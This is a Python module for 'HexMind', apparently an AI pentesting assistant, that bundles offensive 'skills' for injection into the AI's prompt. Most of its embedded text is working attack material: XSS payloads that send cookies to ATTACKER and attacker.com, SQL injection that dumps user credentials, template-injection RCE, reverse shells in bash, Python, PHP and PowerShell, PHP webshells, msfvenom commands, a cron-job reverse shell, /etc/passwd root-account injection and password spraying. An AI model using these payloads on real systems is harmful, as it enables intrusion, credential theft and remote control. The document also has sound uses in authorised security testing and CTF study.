"""
HexMind Skills Library System
Users can install skills from free online resources (GitHub, exploit-db, etc.)
Skills are stored in ~/.hexmind/skills/ and loaded on demand.
"""

import os
import json
from pathlib import Path
from datetime import datetime

SKILLS_DIR = Path.home() / ".hexmind" / "skills"
SKILLS_DIR.mkdir(parents=True, exist_ok=True)
INDEX_FILE = SKILLS_DIR / "index.json"

# ── BUILT-IN SKILL CATALOG ────────────────────────────────────────────────────
# These are free skills the user can install with one command.
SKILL_CATALOG = [
    {
        "id":      "web-top10",
        "name":    "OWASP Top 10 Guide",
        "desc":    "Full OWASP Top 10 2023 — detailed explanations & payloads",
        "source":  "builtin",
        "tags":    ["web", "owasp", "pentest"],
        "size":    "~15KB",
    },
    {
        "id":      "linux-privesc",
        "name":    "Linux Privilege Escalation Bible",
        "desc":    "100+ privesc techniques, SUID/SGID/cron/PATH/capabilities",
        "source":  "builtin",
        "tags":    ["linux", "privesc", "root"],
        "size":    "~20KB",
    },
    {
        "id":      "windows-privesc",
        "name":    "Windows Privilege Escalation Guide",
        "desc":    "AlwaysInstallElevated, token impersonation, unquoted paths, AD attacks",
        "source":  "builtin",
        "tags":    ["windows", "privesc", "AD"],
        "size":    "~18KB",
    },
    {
        "id":      "ctf-toolkit",
        "name":    "CTF Toolkit",
        "desc":    "Forensics, stego, crypto, web, OSINT — complete CTF methodology",
        "source":  "builtin",
        "tags":    ["ctf", "forensics", "crypto"],
        "size":    "~20KB",
    },
    {
        "id":      "recon-playbook",
        "name":    "Recon Playbook",
        "desc":    "Full passive+active recon methodology — bug bounty ready",
        "source":  "builtin",
        "tags":    ["recon", "osint", "bugbounty"],
        "size":    "~15KB",
    },
    {
        "id":      "payload-library",
        "name":    "Payload Library",
        "desc":    "XSS, SQLi, SSTI, LFI, XXE, command injection payloads & WAF bypasses",
        "source":  "builtin",
        "tags":    ["payloads", "web", "bypass"],
        "size":    "~25KB",
    },
    {
        "id":      "revshell-bible",
        "name":    "Reverse Shell Bible",
        "desc":    "Every reverse shell method — bash, python, php, powershell, msfvenom",
        "source":  "builtin",
        "tags":    ["revshell", "post-exploit"],
        "size":    "~10KB",
    },
    {
        "id":      "ad-attacks",
        "name":    "Active Directory Attack Playbook",
        "desc":    "Kerberoasting, AS-REP, BloodHound, Pass-the-Hash, DCSync",
        "source":  "builtin",
        "tags":    ["AD", "windows", "kerberos"],
        "size":    "~15KB",
    },
    {
        "id":      "bugbounty-guide",
        "name":    "Bug Bounty Hunter Guide",
        "desc":    "Platform strategy, scope analysis, report writing, high-value vulns",
        "source":  "builtin",
        "tags":    ["bugbounty", "web", "report"],
        "size":    "~12KB",
    },
    {
        "id":      "python-tools",
        "name":    "Python Hacking Toolkit",
        "desc":    "Port scanners, web scrapers, exploit scripts, automation tools",
        "source":  "builtin",
        "tags":    ["python", "scripting", "tools"],
        "size":    "~20KB",
    },
]

# ── BUILT-IN SKILL CONTENT ────────────────────────────────────────────────────
SKILL_DATA = {

"web-top10": """# OWASP Top 10 — 2023 Edition

## A01: Broken Access Control (IDOR/Auth bypass)
**Detection:**
```
Change: /api/user/1 → /api/user/2  (horizontal priv esc)
Change role in JWT/cookie
Access /admin without auth
```
**Exploit:**
```bash
# Burp Suite: change user ID in every request
# JWT: decode at jwt.io → change role to admin → forge (if weak secret)
jwt_tool token.txt -C -d wordlist.txt   # crack JWT secret
```

## A02: Cryptographic Failures
```bash
# Find sensitive data in transit
wireshark / tcpdump -i eth0
# Check SSL/TLS
sslscan target.com
testssl.sh target.com
# Find hardcoded secrets
grep -r "password\\|api_key\\|secret" . --include="*.js"
truffleHog --regex --entropy=False .
```

## A03: Injection (SQLi, Command, SSTI)
```bash
# SQLi quick test
' OR 1=1--
' AND SLEEP(5)--
# SSTI
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
# Command injection
; id    | id    `id`    $(id)    & id
# LFI
../../../../etc/passwd
```

## A04: Insecure Design (Business Logic)
- Test: negative prices, skip steps, race conditions
- Tools: Burp Intruder with Turbo Intruder for race conditions

## A05: Security Misconfiguration
```bash
# Check exposed paths
/.git/  /.env  /config  /backup  /admin  /.DS_Store
/phpinfo.php  /server-status  /debug  /api/swagger.json
# Headers check
curl -I http://target.com
# Nikto scan
nikto -h http://target.com
```

## A06: Vulnerable Components
```bash
whatweb http://target.com          # tech fingerprint
nuclei -l alive.txt -t cves/       # known CVEs
searchsploit jquery 3.1.1          # check version in exploit-db
retire.js --path /js/              # JS library vulns
```

## A07: Auth Failures
```bash
# Username enum (timing attack / error diff)
# Password spray
hydra -L users.txt -p Password123 http://target.com http-post-form "/login:u=^USER^&p=^PASS^:F=invalid"
# Default creds: admin:admin, admin:password, root:root
```

## A08: Software Integrity (Supply chain)
- Check: npm audit, safety (python), Dependabot alerts

## A09: Logging Failures (WAF bypass for logging)
- Look for: no 4xx/5xx responses in logs, unmonitored endpoints

## A10: SSRF
```bash
# Payloads
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://[::1]/
file:///etc/passwd
# Tools
ssrfmap.py -r request.txt -p url
```""",

"linux-privesc": """# Linux Privilege Escalation — Complete Guide

## Step 0: Stabilize shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm
```

## Step 1: Run LinPEAS (always do this first)
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee linpeas.out
```

## Step 2: sudo
```bash
sudo -l
# If specific binary → check gtfobins.github.io
sudo vim -c ':!/bin/bash'      # sudo vim escape
sudo find / -exec /bin/bash \\; # sudo find escape
sudo python3 -c 'import os;os.system("/bin/bash")'
sudo awk 'BEGIN {system("/bin/bash")}'
```

## Step 3: SUID binaries
```bash
find / -perm -4000 2>/dev/null | xargs ls -la
# Check each at: gtfobins.github.io (filter SUID)
# Common: find, vim, python, nmap, bash, less, more, man, cp, mv
# Example: SUID bash
/usr/bin/bash -p    # drops into root bash

# SUID find
find / -exec /bin/bash -p \;
```

## Step 4: Capabilities
```bash
getcap -r / 2>/dev/null
# Dangerous caps: cap_setuid, cap_net_raw, cap_dac_read_search
# Example: python3 with cap_setuid
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## Step 5: Writable cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron* /var/spool/cron
# If writable script runs as root:
echo "bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /etc/cron.d/backup.sh
# Monitor cron execution:
pspy64   # download from github/DominicBreuker/pspy
```

## Step 6: PATH injection
```bash
# If sudo script uses relative paths:
sudo -l  # see: env_keep+=PATH
echo "/bin/bash" > /tmp/ls && chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo /usr/bin/script_that_calls_ls
```

## Step 7: Writable /etc/passwd
```bash
# Generate hash
openssl passwd -1 -salt hax 'password'
# Add line
echo 'hax:HASH:0:0:hax:/root:/bin/bash' >> /etc/passwd
su hax
```

## Step 8: NFS no_root_squash
```bash
cat /etc/exports  # look for no_root_squash
showmount -e TARGET_IP
mount -o rw,vers=3 TARGET_IP:/share /mnt/share
# On attacker (as root):
cp /bin/bash /mnt/share/ && chmod +s /mnt/share/bash
# On target:
/share/bash -p   # → root
```

## Step 9: Docker escape
```bash
# If user is in docker group:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Step 10: Screen/Tmux socket
```bash
ls -la /tmp/.ICE-unix/  /tmp/.X*
ls /var/run/screen/S-root/
# If readable: screen -x root/pts-0
```

## Resources
- gtfobins.github.io — binary escape techniques
- github.com/carlospolop/PEASS-ng — LinPEAS
- book.hacktricks.xyz/linux-hardening/privilege-escalation""",

"payload-library": """# HexMind Payload Library

## XSS Payloads
```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Attribute escape -->
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(1)

<!-- WAF bypass -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<details open ontoggle=alert(1)>
<svg><script>alert&#40;1&#41;</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>

<!-- Cookie steal -->
<script>fetch('http://ATTACKER/?c='+document.cookie)</script>
<img src=x onerror="document.location='http://ATTACKER/?c='+btoa(document.cookie)">

<!-- CSP bypass (if unsafe-inline blocked) -->
<script src="https://attacker.com/xss.js"></script>
```

## SQL Injection
```sql
-- Detection
' " ` ; -- # /*
' OR 1=1-- -
' AND '1'='1

-- Union-based
' ORDER BY 1-- -
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -

-- Time-based blind
' AND SLEEP(5)-- -           # MySQL
'; WAITFOR DELAY '0:0:5'-- - # MSSQL
' AND pg_sleep(5)-- -        # PostgreSQL

-- Error-based
' AND extractvalue(1,concat(0x7e,database()))-- -
' AND updatexml(1,concat(0x7e,version()),1)-- -
```

## SSTI (Server-Side Template Injection)
```
{{7*7}}        # Jinja2/Twig → 49
${7*7}         # FreeMarker → 49
#{7*7}         # Thymeleaf → 49
<%= 7*7 %>     # ERB (Ruby)
{7*7}          # Smarty

# Jinja2 RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}

# FreeMarker RCE:
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## LFI / Path Traversal
```
../../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/passwd%00.png    # Null byte (PHP < 5.3)

# Interesting files:
/etc/shadow  /etc/hosts  /etc/crontab
/proc/self/environ  /proc/self/cmdline
/var/log/apache2/access.log  (log poisoning)
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\Windows\\win.ini
```

## Command Injection
```bash
; id
| id
|| id
&& id
`id`
$(id)
%0aid         # URL encoded newline
\nid          # newline
```

## XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

## SSRF Payloads
```
http://127.0.0.1/admin
http://localhost:8080
http://[::1]/
http://169.254.169.254/latest/meta-data/   # AWS
http://metadata.google.internal/            # GCP
http://169.254.169.254/metadata/instance   # Azure
file:///etc/passwd
dict://127.0.0.1:6379/info    # Redis
gopher://127.0.0.1:3306/_    # MySQL
```""",

"revshell-bible": """# Reverse Shell Bible

## Listener Setup
```bash
rlwrap nc -lvnp 4444          # Best: rlwrap adds arrow keys
nc -lvnp 4444                 # Basic
socat TCP-L:4444 -            # Socat (more stable)
```

## Bash
```bash
bash -i >& /dev/tcp/LHOST/4444 0>&1
bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
/bin/bash -l > /dev/tcp/LHOST/4444 0<&1 2>&1
exec 5<>/dev/tcp/LHOST/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Python
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])'
```

## PHP
```php
php -r '$sock=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("LHOST",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```
**PHP webshell:**
```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

## PowerShell (Windows)
```powershell
# Basic
$c=New-Object System.Net.Sockets.TCPClient("LHOST",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($r),0,$r.Length)};$c.Close()

# Encoded (bypass execution policy)
powershell -EncodedCommand [BASE64_ABOVE]
```

## msfvenom payloads
```bash
# Windows EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php

# Python
msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=4444 -f raw
```

## Shell Stabilization (critical!)
```bash
# Method 1: Python pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 cols 120

# Method 2: socat (fully interactive)
# On attacker:
socat TCP-L:4445 file:`tty`,raw,echo=0
# On target:
socat TCP:LHOST:4445 EXEC:'/bin/bash',pty,stderr,sigint,sane

# Method 3: pwncat
pip install pwncat-cs
pwncat-cs -lp 4444
```

## File Transfer
```bash
# Python HTTP server
python3 -m http.server 8080

# Download on target
wget http://LHOST:8080/file
curl -O http://LHOST:8080/file
# Windows
certutil -urlcache -f http://LHOST:8080/file.exe file.exe
iwr -Uri http://LHOST:8080/file.exe -OutFile file.exe
```
More at: revshells.com""",

"recon-playbook": """# HexMind Recon Playbook — Bug Bounty Ready

## Phase 1: Passive Recon (no contact with target)

### Subdomain Discovery
```bash
# Multi-tool approach (combine outputs)
subfinder -d target.com -o subs_subfinder.txt
amass enum -passive -d target.com -o subs_amass.txt
assetfinder --subs-only target.com > subs_assetfinder.txt
cat subs_*.txt | sort -u > all_subs.txt

# Certificate transparency (no tools needed)
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//' | sort -u

# DNS brute force
dnsx -l wordlist.txt -d target.com -r  # with resolvers
```

### URL / Historical Data
```bash
waybackurls target.com | sort -u > urls_wayback.txt
gau target.com | sort -u > urls_gau.txt
cat urls_*.txt | sort -u | tee all_urls.txt

# Find interesting params
cat all_urls.txt | grep "=" | qsreplace "FUZZ" > params.txt
```

### Google Dorks
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "password" OR "secret" OR "api_key"
site:target.com ext:php OR ext:asp OR ext:aspx
"target.com" "api_key" site:github.com
```

### Shodan
```
org:"Target Inc"
ssl:"target.com"
hostname:target.com port:8080
```

## Phase 2: Asset Discovery

### Port Scanning
```bash
# Subdomain to IP
dnsx -l all_subs.txt -a -resp | awk '{print $NF}' | sort -u > ips.txt

# Fast scan all IPs
naabu -l ips.txt -o ports.txt
masscan -iL ips.txt -p0-65535 --rate=10000 -oG masscan.out

# Deep scan alive subs
httpx -l all_subs.txt -title -tech-detect -status-code -o alive.txt
```

### Tech Detection
```bash
whatweb http://target.com
wappalyzer (browser extension)
# Detect WAF
wafw00f http://target.com
```

## Phase 3: Active Recon

### Directory Fuzzing
```bash
# Quick
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# Thorough  
ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.bak,.txt,.zip,.git,.env -mc 200,301,302,403,500

# API endpoints
ffuf -u http://target.com/api/v1/FUZZ -w api_wordlist.txt
```

### JS File Mining
```bash
katana -u http://target.com -jc -o js_urls.txt
# Extract endpoints from JS
cat js_urls.txt | grep "\.js" | while read url; do
  curl -s "$url" | grep -oE '"(/api/[^"]+)"' | tr -d '"'
done

# Find secrets in JS
curl -s http://target.com/app.js | grep -iE "api_key|secret|password|token"
truffleHog --regex --json .
```

## Phase 4: Prioritize Targets
```bash
# Find login pages
cat alive.txt | grep -i "login\|signin\|auth\|portal"

# Find interesting params (SQLi/XSS/SSRF targets)
cat all_urls.txt | grep "=" | grep -iE "id=|user=|url=|path=|file=|page=|redirect="

# Run nuclei on alive hosts
nuclei -l alive.txt -t ~/nuclei-templates/ -severity medium,high,critical -o nuclei.out
```

## Tools Installation
```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
```""",

"ctf-toolkit": """# CTF Toolkit — Complete Methodology

## General First Steps
```bash
file challenge.*          # What type of file?
strings challenge.* | grep -i "flag\\|CTF\\|htb\\|thm"
binwalk challenge.*       # Hidden files/data?
exiftool challenge.*      # Metadata?
xxd challenge.* | head    # Hex dump
```

## Web Challenges
```bash
# Always check:
curl -s http://target/ | grep -i flag
view-source in browser
# robots.txt, sitemap.xml, .well-known/
curl http://target/robots.txt
# Check JS files, HTML comments
# Cookies: base64 decode, JWT decode
echo "COOKIE" | base64 -d
jwt_tool token -T   # decode JWT

# Try SQLi, XSS, LFI immediately
# Use Burp Suite for request analysis
```

## Forensics / Steganography
```bash
# Images
exiftool image.jpg
steghide extract -sf image.jpg -p ""   # no password
steghide extract -sf image.jpg -p "password"
stegseek image.jpg rockyou.txt          # brute force passphrase
zsteg image.png                         # PNG stego
python3 stegpy image.png               # stegpy

# Files within files
binwalk -e challenge.jpg               # extract embedded
foremost -i challenge.jpg              # file carving
dd if=challenge.jpg of=hidden.zip skip=OFFSET bs=1

# Audio
audacity (spectrogram analysis)
sonic-visualiser
# DTMF tones: multimon-ng -t WAV -a DTMF audio.wav

# Memory dumps
volatility3 -f memory.dmp windows.pslist.PsList
volatility3 -f memory.dmp windows.cmdline.CmdLine
strings memory.dmp | grep flag

# Network (PCAP)
wireshark / tcpdump
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -e http.file_data  # extract files
```

## Cryptography
```bash
# Identify
hash-identifier HASH
hashid -m HASH

# Base encoding
echo "..." | base64 -d
echo "..." | base64 -d | base64 -d   # double encoded
python3 -c "import base64; print(base64.b32decode('...'))"

# Caesar/ROT
echo "TEXT" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # ROT13
# dcode.fr for all cipher identification

# Hash cracking
hashcat -m 0 hash.txt rockyou.txt        # MD5
hashcat -m 100 hash.txt rockyou.txt      # SHA1
john hash.txt --wordlist=rockyou.txt

# RSA (weak keys)
python3 factordb.py  # factor n at factordb.com
RsaCtfTool --publickey key.pub --attack all

# XOR
python3 -c "ct=bytes.fromhex('...'); key=b'key'; print(bytes([c^k for c,k in zip(ct,key*len(ct))]).decode())"
```

## Reverse Engineering
```bash
file binary
strings binary | grep flag
ltrace ./binary     # library calls
strace ./binary     # syscalls
gdb ./binary        # debugger
ghidra / ida free   # decompiler
objdump -d binary | head -100  # disassemble

# Python decompile
uncompyle6 file.pyc > file.py

# .NET
dotPeek / ILSpy / dnSpy

# Android APK
jadx app.apk      # decompile
apktool d app.apk # decode resources
```

## OSINT
```bash
# Username search
python3 sherlock username --print-all
# Social media: LinkedIn, Twitter/X, Instagram, GitHub, Reddit
# Search: "username" site:github.com

# Email investigation
hunter.io  theHarvester -d company.com -b all

# Image OSINT
# Google Images (reverse search), TinEye, Yandex
# EXIF: exiftool image.jpg
# Geolocation: geospy.net, picarta.ai

# Domain/IP OSINT
whois target.com
shodan search hostname:target.com
censys search target.com
```

## Platforms
- **TryHackMe:** tryhackme.com (beginner-friendly, guided)
- **HackTheBox:** hackthebox.com (realistic, harder)
- **PicoCTF:** picoctf.org (great crypto/forensics)
- **OverTheWire:** overthewire.org (bash wargames — start with Bandit)
- **CryptoHack:** cryptohack.org (crypto focused)
- **pwn.college:** pwn.college (pwn/exploit dev)""",
}


def load_index() -> dict:
    return _load_json(INDEX_FILE, {"installed": []})


def _load_json(path: Path, default):
    try:
        if path.exists():
            return json.loads(path.read_text())
    except Exception:
        pass
    return default


def _save_json(path: Path, data):
    try:
        path.write_text(json.dumps(data, indent=2))
    except Exception:
        pass


class SkillsManager:
    def __init__(self):
        self.index = load_index()

    def get_installed(self) -> list:
        return self.index.get("installed", [])

    def is_installed(self, skill_id: str) -> bool:
        return skill_id in self.get_installed()

    def install(self, skill_id, console=None) -> bool:
        _p = console.print if hasattr(console,"print") else (console if callable(console) else print)
        skill = next((s for s in SKILL_CATALOG if s["id"] == skill_id), None)
        if not skill:
            _p(f"  Unknown skill: {skill_id}")
            return False

        if self.is_installed(skill_id):
            _p(f"  {skill['name']} already installed.")
            return True

        content = SKILL_DATA.get(skill_id)
        if not content:
            _p(f"  No data for skill: {skill_id}")
            return False

        skill_file = SKILLS_DIR / f"{skill_id}.md"
        skill_file.write_text(content)

        self.index.setdefault("installed", []).append(skill_id)
        _save_json(INDEX_FILE, self.index)
        _p(f"  Installed: {skill['name']}")
        return True

    def uninstall(self, skill_id, console=None) -> bool:
        _p = console.print if hasattr(console,"print") else (console if callable(console) else print)
        skill_file = SKILLS_DIR / f"{skill_id}.md"
        if skill_file.exists():
            skill_file.unlink()
        if skill_id in self.index.get("installed", []):
            self.index["installed"].remove(skill_id)
            _save_json(INDEX_FILE, self.index)
        _p(f"  Uninstalled: {skill_id}")
        return True

    def install_all(self, console):
        for skill in SKILL_CATALOG:
            self.install(skill["id"], console)

    def install_custom(self, source: str, console) -> bool:
        """Installs a skill from a raw text snippet or a direct GitHub URL."""
        _p = console.print if hasattr(console, "print") else (console if callable(console) else print)
        
        content = source
        name = "Custom Skill"
        skill_id = f"custom-{int(datetime.now().timestamp())}"
        
        if source.startswith("http://") or source.startswith("https://"):
            _p(f"  [dim cyan]Fetching skill from {source}...[/dim cyan]")
            try:
                import urllib.request
                req = urllib.request.Request(source, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    content = response.read().decode('utf-8', errors='ignore')
                name = source.split("/")[-1].replace(".md", "").replace(".txt", "").capitalize()
                skill_id = f"custom-{name.lower()}"
            except Exception as e:
                _p(f"  [red]Failed to fetch custom skill: {e}[/red]")
                return False
                
        skill_file = SKILLS_DIR / f"{skill_id}.md"
        skill_file.write_text(content)
        
        self.index.setdefault("installed", []).append(skill_id)
        
        # Add a custom metadata entry to our local index so it shows up in search
        self.index.setdefault("custom_catalog", {})[skill_id] = {
            "id": skill_id,
            "name": name,
            "desc": "User imported custom skill",
            "tags": ["custom"],
            "size": f"~{len(content)//1024}KB"
        }
        
        _save_json(INDEX_FILE, self.index)
        _p(f"  [bold green]✓ Successfully installed custom skill '{name}'[/bold green]")
        return True

    def get_skill_content(self, skill_id: str) -> str:
        skill_file = SKILLS_DIR / f"{skill_id}.md"
        if skill_file.exists():
            return skill_file.read_text()
        # Check built-in even if not "installed"
        return SKILL_DATA.get(skill_id, "")

    def search_skills(self, query: str) -> list:
        """Search installed skills for relevant content."""
        results = []
        q = query.lower()
        
        # Combine default catalog with custom imported skills
        custom_catalog = self.index.get("custom_catalog", {})
        
        for sid in self.get_installed():
            content = self.get_skill_content(sid)
            if q in content.lower():
                # Find metadata
                skill = next((s for s in SKILL_CATALOG if s["id"] == sid), None)
                if not skill and sid in custom_catalog:
                    skill = custom_catalog[sid]
                    
                if skill:
                    results.append((skill, content))
        return results

    def get_context_for_query(self, query: str) -> str:
        """Return relevant skill content to inject into AI prompt."""
        results = self.search_skills(query)
        if not results:
            return ""
        # Return first match snippet
        skill, content = results[0]
        lines = content.split("\n")
        return f"\n\n[Installed Skill: {skill['name']}]\n" + "\n".join(lines[:40])

    def show_catalog(self, console):
        from rich.table import Table
        from rich import box
        installed = set(self.get_installed())
        t = Table(
            title="[bold cyan]HexMind Skills Library[/bold cyan]",
            box=box.ROUNDED, border_style="cyan", show_lines=True
        )
        t.add_column("#",       style="bold cyan", width=3)
        t.add_column("Skill",   style="bold white",  min_width=28)
        t.add_column("Status",  style="green",        width=10)
        t.add_column("Tags",    style="dim yellow",   min_width=20)
        t.add_column("Size",    style="dim",          width=8)

        for i, skill in enumerate(SKILL_CATALOG, 1):
            status = "[green]✓ Installed[/green]" if skill["id"] in installed else "[dim]Available[/dim]"
            tags   = ", ".join(skill["tags"])
            t.add_row(str(i), skill["name"], status, tags, skill.get("size", "?"))

        custom_catalog = self.index.get("custom_catalog", {})
        for cid, skill in custom_catalog.items():
            if cid in installed:
                tags = ", ".join(skill.get("tags", ["custom"]))
                t.add_row(cid, f"[yellow]{skill['name']}[/yellow]", "[green]✓ Installed[/green]", tags, skill.get("size", "?"))

        console.print(t)

    def show_menu(self, console):
        """Interactive skills menu."""
        from rich.prompt import Prompt
        while True:
            console.print()
            self.show_catalog(console)
            console.print(
                "\n  [bold]Commands:[/bold]\n"
                "  [cyan]install <number>[/cyan]    Install a skill\n"
                "  [cyan]install all[/cyan]         Install all skills\n"
                "  [cyan]import <url|text>[/cyan]   Import a custom skill from GitHub or Raw Text\n"
                "  [cyan]remove <id|num>[/cyan]     Remove a skill\n"
                "  [cyan]back[/cyan]                Return to chat\n"
            )
            cmd = Prompt.ask("  [bold cyan]Skills[/bold cyan]").strip()
            cmd_lower = cmd.lower()

            if cmd_lower in ("back", "exit", "q", ""):
                break
            elif cmd_lower == "install all":
                self.install_all(console)
            elif cmd_lower.startswith("import "):
                source = cmd[7:].strip()
                if source:
                    self.install_custom(source, console)
                else:
                    console.print("  [red]Usage: import <url|text>[/red]")
            elif cmd_lower.startswith("install "):
                try:
                    idx = int(cmd_lower.split()[1]) - 1
                    skill_id = SKILL_CATALOG[idx]["id"]
                    self.install(skill_id, console)
                except (ValueError, IndexError):
                    console.print("  [red]Invalid number.[/red]")
            elif cmd_lower.startswith("remove "):
                target = cmd_lower.split()[1]
                try:
                    # Try to parse as index first
                    idx = int(target) - 1
                    skill_id = SKILL_CATALOG[idx]["id"]
                    self.uninstall(skill_id, console)
                except (ValueError, IndexError):
                    # Fallback to string ID for custom skills
                    if target.startswith("custom-"):
                        self.uninstall(target, console)
                    else:
                        console.print("  [red]Invalid number or skill ID.[/red]")
            else:
                console.print("  [dim]Unknown command. Use: install <n>, import <url>, remove <n|id>, back[/dim]")
